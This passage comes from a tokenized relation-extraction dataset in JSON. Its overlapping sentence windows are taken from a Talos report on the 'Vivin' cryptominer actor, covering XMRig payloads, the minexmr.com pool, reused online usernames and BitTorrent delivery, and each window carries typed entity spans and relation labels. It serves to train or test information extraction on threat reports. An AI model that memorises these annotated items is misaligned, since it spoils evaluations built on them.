"Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "XMRig", "pos": [14, 15], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "cmd.exe", "pos": [18, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "XMRig payloads", "pos": [3, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "JSON configuration", "pos": [8, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "Vivin", "pos": [5, 6], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [86, 86], "name": "wallet address", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "actor", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [127, 127], "name": "malware", "pos": [30, 31], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [138, 138], "name": "actor", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [156, 156], "name": "XMRig payload", "pos": [27, 29], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [176, 176], "name": "minexmr.com", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [191, 191], "name": "XMRig payloads", "pos": [29, 31], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [208, 208], "name": "Vivin", "pos": [14, 15], "index": "12_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [232, 232], "name": "file crypters", "pos": [12, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [235, 235], "name": "rootkits", "pos": [15, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [237, 237], "name": "process-hollowing", "pos": [17, 18], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "ST", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "RF", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "t": 10, "h": 11}, {"r": "RF", "evidence": [5], "t": 10, "h": 11}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "WR", "evidence": [5, 6, 7], "h": 11, "t": 13}, {"r": "WR", "evidence": [5, 6, 7], "h": 11, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "h": 11, "t": 15}]}, {"title": "647-31", "sents": [["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "XMRig payloads", "pos": [3, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "JSON configuration", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "Vivin", "pos": [5, 6], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [35, 35], "name": "wallet address", "pos": [8, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "actor", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "malware", "pos": [30, 31], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "actor", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [105, 105], "name": "XMRig payload", "pos": [27, 29], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [125, 125], "name": "minexmr.com", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "XMRig payloads", "pos": [29, 31], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [157, 157], "name": "Vivin", "pos": [14, 15], "index": "10_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [181, 181], "name": "file crypters", "pos": [12, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "rootkits", "pos": [15, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": "process-hollowing", "pos": [17, 18], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "ST", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "RF", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "ST", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "RF", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "RF", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 7}, {"r": "ST", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "RF", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "ST", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "RF", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4], "t": 8, "h": 9}, {"r": "RF", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "WR", "evidence": [4, 5, 6], "h": 9, "t": 13}]}, {"title": "647-32", "sents": [["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "Vivin", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "wallet address", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "actor", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [49, 49], "name": "malware", "pos": [30, 31], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "actor", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "XMRig payload", "pos": [27, 29], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [98, 98], "name": "minexmr.com", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [113, 113], "name": "XMRig payloads", "pos": [29, 31], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "Vivin", "pos": [14, 15], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [154, 154], "name": "file crypters", "pos": [12, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [157, 157], "name": "rootkits", "pos": [15, 16], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "process-hollowing", "pos": [17, 18], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "dropper", "pos": [14, 15], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [216, 216], "name": "BitTorrent", "pos": [23, 24], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "ST", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "ST", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "ST", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "ST", "evidence": [3], "t": 6, "h": 7}, {"r": "RF", "evidence": [3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 9}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 10}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 8, "h": 13}, {"r": "WR", "evidence": [5, 6, 7], "t": 10, "h": 13}, {"r": "WR", "evidence": [5, 6, 7], "t": 11, "h": 13}, {"r": "WR", "evidence": [7], "t": 12, "h": 13}]}, {"title": "647-33", "sents": [["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "actor", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "malware", "pos": [30, 31], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "actor", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [59, 59], "name": "XMRig payload", "pos": [27, 29], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [79, 79], "name": "minexmr.com", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [94, 94], "name": "XMRig payloads", "pos": [29, 31], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "Vivin", "pos": [14, 15], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [135, 135], "name": "file crypters", "pos": [12, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "rootkits", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "process-hollowing", "pos": [17, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [188, 188], "name": "dropper", "pos": [14, 15], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [197, 197], "name": "BitTorrent", "pos": [23, 24], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [200, 200], "name": "actor", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [204, 204], "name": "wallet addresses", "pos": [5, 7], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "ST", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "ST", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "ST", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "t": 4, "h": 5}, {"r": "RF", "evidence": [2], "t": 4, "h": 5}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 8}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "WR", "evidence": [3, 4, 5, 6], "t": 6, "h": 11}, {"r": "WR", "evidence": [4, 5, 6], "t": 8, "h": 11}, {"r": "WR", "evidence": [4, 5, 6], "t": 9, "h": 11}, {"r": "WR", "evidence": [6], "t": 10, "h": 11}]}, {"title": "647-34", "sents": [["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."], ["The", "first", ",", "``", "45VgqBWVhgu5LHSafj4q5sB3wuYXGvrSs5N9KL", ",", "''", "we", "found", "hard-coded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "actor", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [27, 27], "name": "XMRig payload", "pos": [27, 29], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [47, 47], "name": "minexmr.com", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [62, 62], "name": "XMRig payloads", "pos": [29, 31], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "Vivin", "pos": [14, 15], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [103, 103], "name": "file crypters", "pos": [12, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [106, 106], "name": "rootkits", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "process-hollowing", "pos": [17, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "dropper", "pos": [14, 15], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [165, 165], "name": "BitTorrent", "pos": [23, 24], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [168, 168], "name": "actor", "pos": [1, 2], "index": "10_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [172, 172], "name": "wallet addresses", "pos": [5, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [204, 204], "name": "XMRig payload", "pos": [15, 17], "index": "12_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 7}, {"r": "WR", "evidence": [2, 3, 4, 5], "t": 4, "h": 9}, {"r": "WR", "evidence": [3, 4, 5], "t": 6, "h": 9}, {"r": "WR", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "WR", "evidence": [5], "t": 8, "h": 9}]}, {"title": "647-35", "sents": [["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."], ["The", "first", ",", "``", "45VgqBWVhgu5LHSafj4q5sB3wuYXGvrSs5N9KL", ",", "''", "we", "found", "hard-coded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "."], ["This", "time", ",", "the", "address", "is", "being", "observed", "on", "the", "``", "minexmr", "''", "mining", "pool", ",", "illustrated", "in", "the", "figure", "below", ",", "the", "same", "pool", "as", "our", "first", "active", "wallet", "address", "linked", "to", "Vivin", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "minexmr.com", "pos": [14, 15], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [29, 29], "name": "XMRig payloads", "pos": [29, 31], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "Vivin", "pos": [14, 15], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [70, 70], "name": "file crypters", "pos": [12, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "rootkits", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "process-hollowing", "pos": [17, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [123, 123], "name": "dropper", "pos": [14, 15], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [132, 132], "name": "BitTorrent", "pos": [23, 24], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "actor", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [139, 139], "name": "wallet addresses", "pos": [5, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "XMRig payload", "pos": [15, 17], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [178, 178], "name": "address", "pos": [4, 5], "index": "11_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [203, 203], "name": "wallet address", "pos": [29, 31], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [207, 207], "name": "Vivin", "pos": [33, 34], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 1, "t": 5}, {"r": "WR", "evidence": [1, 2, 3, 4], "t": 2, "h": 7}, {"r": "WR", "evidence": [2, 3, 4], "t": 4, "h": 7}, {"r": "WR", "evidence": [2, 3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}]}, {"title": "647-36", "sents": [["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."], ["Additionally", ",", "this", "user", "follows", "other", "accounts", "that", "house", "numerous", "repositories", "for", "file", "crypters", ",", "rootkits", ",", "process-hollowing", ",", "and", "other", "tools", "commonly", "used", "in", "malware", "packing", "and", "distribution", "."], ["After", "locating", "the", "initially", "executed", "file", "within", "this", "installation", ",", "dynamic", "and", "static", "analysis", "confirmed", "it", "as", "the", "infection", "source", "."], ["After", "tracing", "the", "file", "write", "operations", "for", "the", "software", "installation", ",", "we", "believe", "the", "dropper", "had", "been", "downloaded", "onto", "the", "victim", "host", "through", "BitTorrent", "."], ["The", "actor", "maintains", "multiple", "cryptocurrency", "wallet", "addresses", ",", "some", "of", "which", "have", "shown", "to", "go", "through", "cycles", "of", "dormancy", "and", "activity", "."], ["The", "first", ",", "``", "45VgqBWVhgu5LHSafj4q5sB3wuYXGvrSs5N9KL", ",", "''", "we", "found", "hard-coded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "."], ["This", "time", ",", "the", "address", "is", "being", "observed", "on", "the", "``", "minexmr", "''", "mining", "pool", ",", "illustrated", "in", "the", "figure", "below", ",", "the", "same", "pool", "as", "our", "first", "active", "wallet", "address", "linked", "to", "Vivin", "."], ["At", "the", "time", "of", "writing", ",", "Talos", "has", "not", "yet", "observed", "any", "specific", "samples", "in", "our", "telemetry", "directly", "tied", "to", "the", "second", "wallet", "address", ";", "however", ",", "data", "from", "VirusTotal", "does", "link", "it", "to", "a", "cryptominer", "submitted", "back", "in", "December", "2017", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "Vivin", "pos": [14, 15], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [38, 38], "name": "file crypters", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "rootkits", "pos": [15, 16], "index": "2_0"}], 